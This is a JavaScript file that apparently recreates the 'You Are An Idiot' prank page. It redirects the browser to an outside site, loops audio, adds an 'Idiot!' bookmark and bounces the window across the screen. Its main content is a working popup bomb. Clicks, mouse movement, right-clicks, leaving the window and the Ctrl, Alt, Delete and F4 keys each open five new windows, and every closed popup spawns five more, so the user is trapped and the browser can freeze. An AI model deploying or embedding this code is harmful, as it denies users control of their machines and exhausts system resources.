function checkAndRedirect() {
    if (document.hasFocus() && !window.location.pathname.includes('/discord.html')) {
        window.location.href = 'https://youare.qzz.io/discord.html';
    }
}
checkAndRedirect();
window.addEventListener('focus', checkAndRedirect);
document.addEventListener('click', function playMusicOnce() {  
    const audio = document.getElementById('youare-audio');  
    const micon = document.getElementById('youare-micon');  
  
    if (!audio || !micon) return;  
  
    document.removeEventListener('click', playMusicOnce);  
}, { once: true });  
  
const faudio = new Audio('media/youare.mp3');  
faudio.addEventListener('timeupdate', function () {  
    if (this.currentTime > this.duration - 0.45) {  
        this.currentTime = 0;  
        this.play();  
    }  
});  
function bookmark() {  
    if (navigator.appName === "Microsoft Internet Explorer" && parseInt(navigator.appVersion) >= 4) {  
        window.external.AddFavorite("discord.html", "‎‎Idiot!");  
    }  
}  
  
const openWindows = [];  
let mouseX = 0;  
let mouseY = 0;  
  
document.addEventListener("mousemove", e => {  
    mouseX = e.clientX;  
    mouseY = e.clientY;  
});  

function openWindow(url) {
    // Dynamic popup size based on the same sizing
    // approach used by index.html.
    const DESIGN_WIDTH = 928;
    const DESIGN_HEIGHT = 929;

    const PREFERRED_WIDTH = 520;
    const PREFERRED_HEIGHT = 521;

    const availableWidth = Math.max(1, screen.availWidth);
    const availableHeight = Math.max(1, screen.availHeight);

    // Preserve the 928x929 aspect ratio.
    // Do not make it larger than the original ~520x521 size.
    const scale = Math.min(
        availableWidth / DESIGN_WIDTH,
        availableHeight / DESIGN_HEIGHT,
        PREFERRED_WIDTH / DESIGN_WIDTH,
        PREFERRED_HEIGHT / DESIGN_HEIGHT
    );

    const width = Math.round(DESIGN_WIDTH * scale);
    const height = Math.round(DESIGN_HEIGHT * scale);

    // Keep the original position exactly as before.
    const left = 0;
    const top = 0;

    const features =
        `menubar=no,status=no,toolbar=no,resizable=no,location=no,` +
        `scrollbars=no,personalbar=no,` +
        `width=${width},height=${height},left=${left},top=${top},` +
        `titlebar=no,alwaysRaised=yes`;

    const aWindow = window.open(url, "_blank", features);

    if (aWindow) {
        openWindows.push(aWindow);

        const timer = setInterval(() => {
            for (let i = openWindows.length - 1; i >= 0; i--) {
                if (openWindows[i].closed) {
                    openWindows.splice(i, 1);
                }
            }

            if (aWindow.closed) {
                clearInterval(timer);
                proCreate();
            }
        }, 0);
    }
}
function proCreate() {
    for (let i = 0; i < 5; i++) {
        openWindow("discord.html");
    }
}

let xOff = 0, yOff = 0;
let xPos = 0, yPos = 0;
let flagRun = 1;

function randomSpeed(multiplier) {
    return (1 + Math.round(34 * Math.random())) * multiplier;
}

function playBall() {
    const multiplier = screen.height >= 1440 ? 2 : 1;

    // Approximate the C#:
    // Screen.PrimaryScreen.Bounds.Width - this.Width
    const maxX = Math.max(0, screen.width - window.outerWidth);

    // Approximate the C#:
    // Screen.PrimaryScreen.Bounds.Height - this.Height
    const maxY = Math.max(0, screen.height - window.outerHeight);

    // Hit right edge
    if (xPos >= maxX) {
        xPos = maxX;
        xOff = -randomSpeed(multiplier);

        if (yOff < 0) {
            yOff = -randomSpeed(multiplier);
        } else if (yOff > 0) {
            yOff = randomSpeed(multiplier);
        } else {
            yOff = randomSpeed(multiplier);
        }
    }

    // Hit bottom edge
    if (yPos >= maxY) {
        yPos = maxY;
        yOff = -randomSpeed(multiplier);

        if (xOff < 0) {
            xOff = -randomSpeed(multiplier);
        } else if (xOff > 0) {
            xOff = randomSpeed(multiplier);
        } else {
            xOff = randomSpeed(multiplier);
        }
    }

    // Hit left edge
    if (xPos <= 0) {
        xPos = 0;
        xOff = randomSpeed(multiplier);

        if (yOff < 0) {
            yOff = -randomSpeed(multiplier);
        } else if (yOff > 0) {
            yOff = randomSpeed(multiplier);
        } else {
            yOff = randomSpeed(multiplier);
        }
    }

    // Hit top edge
    if (yPos <= 0) {
        yPos = 0;
        yOff = randomSpeed(multiplier);

        if (xOff < 0) {
            xOff = -randomSpeed(multiplier);
        } else if (xOff > 0) {
            xOff = randomSpeed(multiplier);
        } else {
            xOff = randomSpeed(multiplier);
        }
    }

    xPos += xOff;
    yPos += yOff;

    if (flagRun === 1) {
        try {
            window.moveTo(
                Math.round(xPos),
                Math.round(yPos)
            );
        } catch {
            flagRun = 0;
            return;
        }

        setTimeout(playBall, 1);
    }
}
  
window.onload = function () {  
    flagRun = 1;  
    playBall();  
    bookmark();
};  
  
window.onmouseout = function () {
    proCreate();
};

window.oncontextmenu = function () {
    proCreate();
    return false;
};  


window.onkeydown = function (event) {
    const keyCode = event.keyCode;

    if ([17, 18, 46, 115].includes(keyCode)) {
        proCreate();
    }
};
window.addEventListener("unload", function () {
   // proCreate();
    openWindow("discord.html");
});
document.onclick=proCreate;
document.onmousemove=proCreate;
